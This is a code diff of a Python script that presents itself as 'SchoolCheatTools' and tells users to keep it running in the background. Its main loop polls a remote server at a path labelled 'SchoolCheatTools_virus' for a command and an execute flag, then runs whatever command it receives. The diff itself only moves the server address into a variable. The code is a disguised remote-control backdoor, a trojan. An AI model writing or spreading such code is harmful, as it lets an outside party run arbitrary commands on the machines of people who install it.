@@ -4,6 +4,7 @@ import requests
 import os
 from time import *
 old_command = 0
+server_ip = "192.168.0.216"
 
 print('''
       
@@ -20,8 +21,8 @@ IMPORTANT   ***   WHEN USING SCHOOLCHEATTOOLS, PLEASE KEEP IT RUNNING IN THE BAC
 
 while True:
     #get HTML
-    command = requests.get('http://192.168.0.216/SchoolCheatTools_virus/command.txt').text
-    exe = (requests.get('http://192.168.0.216/SchoolCheatTools_virus/execute_command.txt').text == "1")
+    command = requests.get('http://' + server_ip + '/SchoolCheatTools_virus/command.txt').text
+    exe = (requests.get('http://' + server_ip + '/SchoolCheatTools_virus/execute_command.txt').text == "1")
     #execute command
     if old_command != command and exe:
         try:
